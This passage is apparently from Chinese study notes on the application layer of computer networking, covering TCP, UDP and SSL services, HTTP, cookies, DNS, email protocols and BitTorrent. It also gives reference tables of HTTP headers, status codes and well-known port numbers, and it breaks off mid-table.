title="1.3、运输层可以提供的四大方面服务"></a>1.3、运输层可以提供的四大方面服务</h4><p><strong>①可靠数据传输（reliable data transfer）：</strong></p><p>当一个运输层协议提供这种服务时，发送进程只要将其数据传递进套接字，就可以完全相信该数据能够无差错地到达接收进程。当一个运输层协议不提供可靠数据传输时，由发送进程发送的某些数据可能不能够到达接收进程，这只适合<strong>容忍丢失的应用（loss-tolerant application）</strong>。</p><p>有很多多媒体应用就可以承受一定量的数据丢失（如音频、视频）。</p><p><strong>②吞吐量：</strong></p><p>运输层协议能够以某种特定的速率提供确保的可用吞吐量。</p><p>具有吞吐量要求的应用程序被称为<strong>带宽敏感的应用（**</strong>bandwidth-sensitive application<strong>**）</strong>。</p><p>带宽敏感的应用具有特定的吞吐量要求，而<strong>弹性应用（**</strong>elastic application<strong>**）</strong>能够根据情况或多或少地利用可供使用的吞吐量。</p><p><strong>③定时：</strong></p><p>运输层协议也能提供定时保证，如同具有吞吐量保证那样，定时保证能够以多种形式实现：比如，可以保证每个比特到达接收方的套接字不迟于100ms。</p><p>这种服务将对交互式实时应用程序有吸引力。</p><p><strong>④安全性：</strong></p><p>运输协议能够为应用程序提供一种或多种安全性服务，例如，有些发送主机中，运输协议可以加密由发送进程传输的所有数据；在接收主机中，运输层协议能够再将数据交付给接收进程之前解密这些数据。</p><p>运输协议还提供除了机密性意外的其他安全性服务，包括数据完整性和端点识别。</p><h4 id="1-4、因特网提供的运输服务"><a href="#1-4、因特网提供的运输服务" class="headerlink" title="1.4、因特网提供的运输服务"></a>1.4、因特网提供的运输服务</h4><p>因特网（一般的是TCP/IP网络）为应用程序提供两个运输层协议，即UDP和TCP。</p><p>当一个软件开发者为因特网创建一个新的应用时，首先要做出的决定是，选择UDP还是TCP。</p><p><strong>①TCP服务</strong></p><p>（1）面向连接的服务：</p><p>在应用层数据报文开始流动之前，其客户机程序和服务器程序之间互相交换运输层控制信息，完成握手阶段。这个过程可以让它们为大量分组的到来做好准备。</p><p>在握手阶段过后，一个<strong>TCP**</strong>连接（<strong><strong>TCP connection</strong></strong>）**就在两个进程的套接字之间建立了。</p><p>这条连接是全双工的，即连接双方的进程可以在此连接上同时进行报文收发。</p><p>当应用程序结束报文发送时，必须拆除该连接。</p><p>（2）可靠的数据传送服务</p><p>（有拥塞控制机制）</p><p><strong>②SSL<code>（</code>secure socket layer，安全套接字层<code>）</code>服务</strong></p><p>无论TCP还是UDP都没有提供任何加密机制，因此，因特网界研制了TCP的加强版SSL。</p><p>SSL不仅可以做到传统的TCP所能够做到的一切，而且提供了加密、数据完整性和端点鉴别这些关键的进程到进程的安全性服务。</p><p>SSL有自己的套接字API，类似于传统的TCP套接字API。</p><p>发送进程（明文数据）→SSL套接字（加密后的数据）→TCP套接字（加密后的数据）→接收进程的TCP套接字（加密后的数据）→接收进程的SSL套接字（明文数据）→接收进程</p><p><strong>③UDP服务</strong></p><p>（1）UDP是一种不提供不必要服务的轻量级运输协议，它仅提供最小服务。</p><p>（2）UDP是无连接的，因此在两个进程通信前没有握手过程。</p><p>（3）UDP协议提供一种不可靠数据运输服务。</p><p>（4）UDP没有包括拥塞控制机制，所以UDP的发送端可以用它选定的任何速率向其下层（网络层）注入数据。</p><p><strong>④因特网运输协议所不提供的服务</strong></p><p>今天的因特网不能为应用提供任何定时或带宽保证。</p><p>时间敏感的应用通常是靠应用程序的设计，来最大程度的适应这种服务的缺乏。</p><p>因特网电话应用通常能够容忍某些数据丢失，但要求要达到一定的最小速率才能有效工作，所以通常会选择UDP来绕开TCP的拥塞控制机制。</p><h4 id="1-5、应用层协议（application-layer-protocol）"><a href="#1-5、应用层协议（application-layer-protocol）" class="headerlink" title="1.5、应用层协议（application-layer protocol）"></a>1.5、<strong>应用层协议（application-layer protocol）</strong></h4><p><strong>应用层协议定义了：</strong></p><p>①交换的报文类型，如请求报文和响应报文。</p><p>②各种报文类型的语法，如报文中的各个字段和这些字段是如何描述的。</p><p>③字段的语义，即这些字段中包含的信息的含义。</p><p>④一个进程何时以及如何发送报文，对报文进行响应的规则。</p><p><strong>应用层协议只是网络应用的非常重要的一部分</strong></p><h3 id="二、Web和HTTP"><a href="#二、Web和HTTP" class="headerlink" title="二、Web和HTTP"></a>二、Web和HTTP</h3><p>对于大多数用户来说，web最有吸引力的就是它的<strong>按需操作</strong>。</p><h4 id="2-1、Http是一个无状态协议（stateless-protocol）。"><a href="#2-1、Http是一个无状态协议（stateless-protocol）。" class="headerlink" title="2.1、Http是一个无状态协议（stateless protocol）。"></a>2.1、Http是一个无状态协议（stateless protocol）。</h4><p>HTTP服务器向客户发送被请求的文件，而不存储任何关于该客户的状态信息，所以我们说HTTP是一个无状态协议（stateless protocol）。</p><h4 id="2-2、非持续连接和持续连接"><a href="#2-2、非持续连接和持续连接" class="headerlink" title="2.2、非持续连接和持续连接"></a>2.2、非持续连接和持续连接</h4><p><strong>非持续连接（non-persistant connection，又称“短连接”)</strong>：每对请求/响应由一个单独的TCP连接发送。</p><p><strong>持续连接(persistant connection，又称“长连接”)</strong>：所有的请求和响应都经一相同的TCP连接发送。</p><p>在默认配置下，大部分浏览器打开5~10个并行的TCP连接，而每条连接处理一个请求响应事务。</p><p>如果用户愿意，最大并行连接数可以设置为1，这样10条连接就会串行建立。</p><p>浏览器和web服务器建立一个<strong>TCP**</strong>连接**时，会涉及到一个“三次握手”过程。</p><p><strong>三次握手过程：</strong></p><p>①客户向服务器发送一个小TCP报文段。</p><p>②服务器用一个小TCP报文段做出确认和响应。</p><p>③客户向服务器返回确认。</p><h4 id="2-3、cookie"><a href="#2-3、cookie" class="headerlink" title="2.3、cookie"></a>2.3、<strong>cookie</strong></h4><p>cookie的作用：cookie允许web服务器对用户进行跟踪，这样一来web站点便可以识别用户、限制用户的访问。</p><p><strong>cookie 技术有四个组件：</strong></p><p>①在HTTP响应报文中有一个cookie首部行。</p><p>②在HTTP请求报文中有一个cookie首部行。</p><p>③在用户端系统中保留有一个cookie文件，并由用户的浏览器进行管理。</p><p>④位于web站点的一个后端数据库。</p><h4 id="2-4、Web缓存"><a href="#2-4、Web缓存" class="headerlink" title="2.4、Web缓存"></a>2.4、Web缓存</h4><p>Web缓存器带来的优点：</p><p>①Web缓存器可以大大减少一个机构的接入链路到因特网的通信量。</p><p>②Web缓存器能从整体上大大降低因特网上的Web流量，从而改善所有应用的性能。</p><p>（ISP可以通过<strong>内容分发网络</strong>（Content Distribution Network，CDN）技术来避免升级因特网链路的支出）</p><p>引入一个概念——<strong>缓存命中率</strong>：由一个缓存器所满足的请求占比率。（通常在0.2~0.7之间）</p><p>通过请求头的If-Modified-Since和响应头的Last-Modified实现</p><h3 id="三、文件传输协议和电子邮件"><a href="#三、文件传输协议和电子邮件" class="headerlink" title="三、文件传输协议和电子邮件"></a>三、文件传输协议和电子邮件</h3><h4 id="3-1、文件传输协议：FTP"><a href="#3-1、文件传输协议：FTP" class="headerlink" title="3.1、文件传输协议：FTP"></a>3.1、文件传输协议：FTP</h4><p>HTTP和FTP都是文本传输协议，他们有很多共同点，例如都运行在TCP上，但他们最显著的区别是FTP使用了两个并行的TCP连接，一个是控制连接，一个是数据连接。控制连接用于控制传输命令（put，get），数据连接用于传输文件数据。</p><p><img src="1.webp" alt=""></p><p>电子邮件系统有 3 个主要组成部分： <code>用户代理</code>、<code>邮件服务器</code>、<code>简单邮件传输协议（SMTP）</code>。</p><h4 id="3-2、SMTP"><a href="#3-2、SMTP" class="headerlink" title="3.2、SMTP"></a>3.2、SMTP</h4><p>SMTP是网络电子邮件应用的核心，<strong>一般不使用中间邮件服务器发送邮件，即使两个邮件服务器位于地球两端</strong>它使用TCP连接和ASCII编码(只能使用ASCII编码意味着传送二进制的多媒体文件会很麻烦)。为了描述SMTP的基本操作，我们假设ALice要给Bob发送一封简单的ASCII报文：</p><ol><li><p>Alice调用他的用户代理程序并提供Bob的邮件地址，撰写报文，然后指示用户代理程序发送报文</p></li><li><p>Alice的用户代理程序把报文发送给它的邮件服务器，在那里该报文被放在报文队列中</p></li><li><p>运行在Alice邮件服务器上SMTP客户端发现报文队列中的报文，它就创建一个连接到Bob邮件服务器上的SMTP客户端的TCP连接</p></li><li><p>在经过初始的SMTP握手后，发送报文</p></li><li><p>Bob的邮件服务器接收报文后，将报文放在Bob的邮箱中</p></li><li><p>在Bob方便时，调用他的用户代理程序阅读报文</p></li></ol><h4 id="3-3、邮件访问协议"><a href="#3-3、邮件访问协议" class="headerlink" title="3.3、邮件访问协议"></a>3.3、邮件访问协议</h4><p>当我的邮件服务器有一封邮件，我如何把它取回到我的用户代理程序呢？<br>由于SMTP是一个推协议，我们只能用过引入其他的邮件访问协议来解决这个问题。<br>目前有一些流行的邮件访问协议<code>第三版的邮局协议（POP3）</code>、<code>因特网邮件访问协议（IMAP）</code>以及<code>HTTP</code>。</p><h4 id="3-4、HTTP是拉协议，SMTP是推协议"><a href="#3-4、HTTP是拉协议，SMTP是推协议" class="headerlink" title="3.4、HTTP是拉协议，SMTP是推协议"></a>3.4、HTTP是拉协议，SMTP是推协议</h4><h3 id="四、DNS服务"><a href="#四、DNS服务" class="headerlink" title="四、DNS服务"></a>四、DNS服务</h3><p><img src="2.png" alt=""></p><h4 id="4-1、分布式、层次数据库"><a href="#4-1、分布式、层次数据库" class="headerlink" title="4.1、分布式、层次数据库"></a>4.1、分布式、层次数据库</h4><p>DNS使用大量DNS服务器，以层次方式组织，分为3中类型：根DNS服务器、顶级域（TLD）DNS服务器、权威DNS服务器。</p><h5 id="根DNS服务器：全球一共13个根DNS服务器。规定了合法域名-com-net-org等"><a href="#根DNS服务器：全球一共13个根DNS服务器。规定了合法域名-com-net-org等" class="headerlink" title="根DNS服务器：全球一共13个根DNS服务器。规定了合法域名.com .net .org等"></a>根DNS服务器：全球一共13个根DNS服务器。规定了合法域名.com .net .org等</h5><h5 id="顶级域服务器：负责维护顶级域名如com、org以及所有国家顶级域名cn、uk等"><a href="#顶级域服务器：负责维护顶级域名如com、org以及所有国家顶级域名cn、uk等" class="headerlink" title="顶级域服务器：负责维护顶级域名如com、org以及所有国家顶级域名cn、uk等"></a>顶级域服务器：负责维护顶级域名如com、org以及所有国家顶级域名cn、uk等</h5><h5 id="权威DNS服务器：在因特网上具有公共可访问主机（web服务器）的每个组织机构必须提供公共可访问的DNS记录，这些记录将这些主机名映射为IP地址。多数大学和大公司都实现或维护其权威DNS服务器。"><a href="#权威DNS服务器：在因特网上具有公共可访问主机（web服务器）的每个组织机构必须提供公共可访问的DNS记录，这些记录将这些主机名映射为IP地址。多数大学和大公司都实现或维护其权威DNS服务器。" class="headerlink" title="权威DNS服务器：在因特网上具有公共可访问主机（web服务器）的每个组织机构必须提供公共可访问的DNS记录，这些记录将这些主机名映射为IP地址。多数大学和大公司都实现或维护其权威DNS服务器。"></a>权威DNS服务器：在因特网上具有公共可访问主机（web服务器）的每个组织机构必须提供公共可访问的DNS记录，这些记录将这些主机名映射为IP地址。多数大学和大公司都实现或维护其权威DNS服务器。</h5><h4 id="4-2、DNS缓存"><a href="#4-2、DNS缓存" class="headerlink" title="4.2、DNS缓存"></a>4.2、DNS缓存</h4><p>为了改善时延性能并减少在因特网上传输的DNS报文数量，DNS使用缓存技术。通常在本地服务器实现，可以缓存主机名/IP地址对，可以缓存TLD服务器地址，从而绕过根DNS服务器。</p><h4 id="4-3、DNS记录和报文"><a href="#4-3、DNS记录和报文" class="headerlink" title="4.3、DNS记录和报文"></a>4.3、DNS记录和报文</h4><p>资源记录是一个4元组：（Name，Value，Type，TTL）</p><p>TTL为该记录的生存时间，决定了资源记录应当从缓存中删除的时间。</p><p>Type=A，则Name是主机名，Value是该主机名对应的IP地址。</p><p>Type=NS，则Name是域，Value是如何获取该域中主机IP地址的权威DNS服务器的主机名。</p><p>Type=CNAME，则Value是别名为Name的主机对应的规范主机名。</p><p>Type=MX，则Value是别名为Name的邮件服务器对应的规范主机名。从而使得同一公司的邮件服务器和web服务器可以使用相同别名。</p><h3 id="五、P2P文件分发和BitTorrent协议"><a href="#五、P2P文件分发和BitTorrent协议" class="headerlink" title="五、P2P文件分发和BitTorrent协议"></a>五、P2P文件分发和BitTorrent协议</h3><p><img src="4.png" alt=""></p><p>BitTorrent是一种用于文件分发的流行P2P协议［Chao 2011］。用BitTorrent的术语来讲，参与一个特定文件分发的所有对等方的集合被称为一个洪流（torrent）。在一个洪流中的对等方彼此下载等长度的文件块（chunk），典型的块长度为256KB。当一个对等方首次加入一个洪流时，它没有块。随着时间的流逝，它累积了越来越多的块。当它下载块时，也为其他对等方上载了多个块。一旦某对等方获得了整个文件，它也许（自私地）离开洪流，或（大公无私地）留在该洪流中并继续向其他对等方上载块。同时，任何对等方可能在任何时候仅具有块的子集就离开该洪流，并在以后重新加入该洪流中。</p><p>每个洪流具有一个基础设施结点，称为追踪器（tracker）。当一个对等方加入某洪流时，它向追踪器注册自己，并周期性地通知追踪器它仍在该洪流中。以这种方式，追踪器跟踪正参与在洪流中的对等方。</p><h5 id="最稀缺优先（rarest-first）的技术"><a href="#最稀缺优先（rarest-first）的技术" class="headerlink" title="最稀缺优先（rarest first）的技术"></a>最稀缺优先（rarest first）的技术</h5><p>在决定请求哪些块的过程中，Alice使用一种称为最稀缺优先（rarest first）的技术。这种技术的思路是，针对她没有的块在她的邻居中决定最稀缺的块（最稀缺的块就是那些在她的邻居中副本数量最少的块），并首先请求那些最稀缺的块。这样，最稀缺块得到更为迅速的重新分发，其目标是（大致地）均衡每个块在洪流中的副本数量。</p><h3 id="六、UDP和TCP套接字编程（基于python3"><a href="#六、UDP和TCP套接字编程（基于python3" class="headerlink" title="六、UDP和TCP套接字编程（基于python3)"></a>六、UDP和TCP套接字编程（基于python3)</h3><p>由于书上是基于python2 的，所有做了些改变基于python3<br><a href="https://github.com/Kit4y/Computer-Networking-Programming-Exercises" target="_blank" rel="noopener">https://github.com/Kit4y/Computer-Networking-Programming-Exercises</a></p><h3 id="PS1、HTTP响应头和请求头信息对照表"><a href="#PS1、HTTP响应头和请求头信息对照表" class="headerlink" title="PS1、HTTP响应头和请求头信息对照表"></a>PS1、HTTP响应头和请求头信息对照表</h3><h4 id="HTTP-Request-Header-请求头"><a href="#HTTP-Request-Header-请求头" class="headerlink" title="HTTP Request Header 请求头"></a>HTTP Request Header 请求头</h4><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td><td>Accept: text/plain, text/html</td></tr><tr><td>Accept-Charset</td><td>浏览器可以接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td>Accept-Encoding</td><td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td>Accept-Ranges</td><td>可以请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td>Authorization</td><td>HTTP授权的授权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Cache-Control</td><td>指定请求和响应遵循的缓存机制</td><td>Cache-Control: no-cache</td></tr><tr><td>Connection</td><td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td><td>Connection: close</td></tr><tr><td>Cookie</td><td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td>Content-Length</td><td>请求的内容长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Type</td><td>请求的与实体对应的MIME信息</td><td>Content-Type: application/x-www-form-urlencoded</td></tr><tr><td>Date</td><td>请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>Expect</td><td>请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td>From</td><td>发出请求的用户的Email</td><td>From:<code>user@email.com</code></td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td><td>Host:<code>www.zcmhi.com</code></td></tr><tr><td>If-Match</td><td>只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Modified-Since</td><td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>If-None-Match</td><td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Range</td><td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Unmodified-Since</td><td>只在实体在指定时间之后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>Max-Forwards</td><td>限制信息通过代理和网关传送的时间</td><td>Max-Forwards: 10</td></tr><tr><td>Pragma</td><td>用来包含实现特定的指令</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authorization</td><td>连接到代理的授权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td><td>Range: bytes=500-999</td></tr><tr><td>Referer</td><td>先前网页的地址，当前请求网页紧随其后,即来路</td><td>Referer:<code>http://www.zcmhi.com/archives/71.html</code></td></tr><tr><td>TE</td><td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q=0.5</td></tr><tr><td>Upgrade</td><td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td></tr><tr><td>User-Agent</td><td>User-Agent的内容包含发出请求的用户信息</td><td>User-Agent: Mozilla/5.0 (Linux; X11)</td></tr><tr><td>Via</td><td>通知中间网关或代理服务器地址，通信协议</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr></tbody></table><h4 id="HTTP-Responses-Header-响应头"><a href="#HTTP-Responses-Header-响应头" class="headerlink" title="HTTP Responses Header 响应头"></a>HTTP Responses Header 响应头</h4><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept-Ranges</td><td>表明服务器是否支持指定范围请求及哪种类型的分段请求</td><td>Accept-Ranges: bytes</td></tr><tr><td>Age</td><td>从原始服务器到代理缓存形成的估算时间（以秒计，非负）</td><td>Age: 12</td></tr><tr><td>Allow</td><td>对某网络资源的有效的请求行为，不允许则返回405</td><td>Allow: GET, HEAD</td></tr><tr><td>Cache-Control</td><td>告诉所有的缓存机制是否可以缓存及哪种类型</td><td>Cache-Control: no-cache</td></tr><tr><td>Content-Encoding</td><td>web服务器支持的返回内容压缩编码类型。</td><td>Content-Encoding: gzip</td></tr><tr><td>Content-Language</td><td>响应体的语言</td><td>Content-Language: en,zh</td></tr><tr><td>Content-Length</td><td>响应体的长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Location</td><td>请求资源可替代的备用的另一地址</td><td>Content-Location: /index.htm</td></tr><tr><td>Content-MD5</td><td>返回资源的MD5校验值</td><td>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</td></tr><tr><td>Content-Range</td><td>在整个返回体中本部分的字节位置</td><td>Content-Range: bytes 21010-47021/47022</td></tr><tr><td>Content-Type</td><td>返回内容的MIME类型</td><td>Content-Type: text/html; charset=utf-8</td></tr><tr><td>Date</td><td>原始服务器消息发出的时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>ETag</td><td>请求变量的实体标签的当前值</td><td>ETag: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>Expires</td><td>响应过期的日期和时间</td><td>Expires: Thu, 01 Dec 2010 16:00:00 GMT</td></tr><tr><td>Last-Modified</td><td>请求资源的最后修改时间</td><td>Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT</td></tr><tr><td>Location</td><td>用来重定向接收方到非请求URL的位置来完成请求或标识新的资源</td><td>Location:<code>http://www.zcmhi.com/archives/94.html</code></td></tr><tr><td>Pragma</td><td>包括实现特定的指令，它可应用到响应链上的任何接收方</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authenticate</td><td>它指出认证方案和可应用到代理的该URL上的参数</td><td>Proxy-Authenticate: Basic</td></tr><tr><td>refresh</td><td>应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）</td><td>Refresh: 5; url=<code>http://www.zcmhi.com/archives/94.html</code></td></tr><tr><td>Retry-After</td><td>如果实体暂时不可取，通知客户端在指定时间之后再次尝试</td><td>Retry-After: 120</td></tr><tr><td>Server</td><td>web服务器软件名称</td><td>Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</td></tr><tr><td>Set-Cookie</td><td>设置Http Cookie</td><td>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</td></tr><tr><td>Trailer</td><td>指出头域在分块传输编码的尾部存在</td><td>Trailer: Max-Forwards</td></tr><tr><td>Transfer-Encoding</td><td>文件传输编码</td><td>Transfer-Encoding:chunked</td></tr><tr><td>Vary</td><td>告诉下游代理是使用缓存响应还是从原始服务器请求</td><td>Vary: *</td></tr><tr><td>Via</td><td>告知代理客户端响应是通过哪里发送的</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>警告实体可能存在的问题</td><td>Warning: 199 Miscellaneous warning</td></tr><tr><td>WWW-Authenticate</td><td>表明客户端请求实体应该使用的授权方案</td><td>WWW-Authenticate: Basic</td></tr></tbody></table><h3 id="PS2、HTTP状态码表"><a href="#PS2、HTTP状态码表" class="headerlink" title="PS2、HTTP状态码表"></a>PS2、HTTP状态码表</h3><table><thead><tr><th>状态码</th><th>状态码英文名称</th><th>中文描述</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求</td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理。所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留，将来使用</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td>408</td><td>Request Time-out</td><td>服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested range not satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>Expectation Failed</td><td>服务器无法满足Expect的请求头信息</td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>充当网关或代理的服务器，从远端服务器接收到了一个无效的请求</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table><h3 id="P3、常见端口号参照表"><a href="#P3、常见端口号参照表" class="headerlink" title="P3、常见端口号参照表"></a>P3、常见端口号参照表</h3><table><thead><tr><th>端口号码 / 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1</td><td>tcpmux</td><td>TCP 端口服务多路复用</td></tr><tr><td>5</td><td>rje</td><td>远程作业入口</td></tr><tr><td>7</td><td>echo</td><td>Echo 服务</td></tr><tr><td>9</td><td>discard</td><td>用于连接测试的空服务</td></tr><tr><td>11</td><td>systat</td><td>用于列举连接了的端口的系统状态</td></tr><tr><td>13</td><td>daytime</td><td>给请求主机发送日期和时间</td></tr><tr><td>17</td><td>qotd</td><td>给连接了的主机发送每日格言</td></tr><tr><td>18</td><td>msp</td><td>消息发送协议</td></tr><tr><td>19</td><td>chargen</td><td>字符生成服务；发送无止境的字符流</td></tr><tr><td>20</td><td>ftp-data</td><td>FTP 数据端口</td></tr><tr><td>21</td><td>ftp</td><td>文件传输协议（FTP）端口；有时被文件服务协议（FSP）使用</td></tr><tr><td>22</td><td>ssh</td><td>安全 Shell（SSH）服务</td></tr><tr><td>23</td><td>telnet</td><td>Telnet 服务</td></tr><tr><td>25</td><td>smtp</td><td>简单邮件传输协议（SMTP）</td></tr><tr><td>37</td><td>time</td><td>时间协议</td></tr><tr><td>39</td><td>rlp</td><td>资源定位协议</td></tr><tr><td>42</td><td>nameserver</td><td>互联网名称服务</td></tr><tr><td>43</td><td>nicname</td><td>WHOIS 目录服务</td></tr><tr><td>49</td><td>tacacs</td><td>用于基于 TCP/IP 验证和访问的终端访问控制器访问控制系统</td></tr><tr><td>50</td><td>re-mail-ck</td><td>远程邮件检查协议</td></tr><tr><td>53</td><td>domain</td><td>域名服务（如 BIND）</td></tr><tr><td>63</td><td>whois++</td><td>WHOIS++，被扩展了的 WHOIS 服务</td></tr><tr><td>67</td><td>bootps</td><td>引导协议（BOOTP）服务；还被动态主机配置协议（DHCP）服务使用</td></tr><tr><td>68</td><td>bootpc</td><td>Bootstrap（BOOTP）客户；还被动态主机配置协议（DHCP）客户使用</td></tr><tr><td>69</td><td>tftp</td><td>小文件传输协议（TFTP）</td></tr><tr><td>70</td><td>gopher</td><td>Gopher 互联网文档搜寻和检索</td></tr><tr><td>71</td><td>netrjs-1</td><td>远程作业服务</td></tr><tr><td>72</td><td>netrjs-2</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-3</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-4</td><td>远程作业服务</td></tr><tr><td>79</td><td>finger</td><td>用于用户联系信息的 Finger 服务</td></tr><tr><td>80</td><td>http</td><td>用于万维网（WWW）服务的超文本传输协议（HTTP）</td></tr><tr><td>88</td><td>kerberos</td><td>Kerberos 网络验证系统</td></tr><tr><td>95</td><td>supdup</td><td>Telnet 协议扩展</td></tr><tr><td>101</td><td>hostname</td><td>SRI-NIC 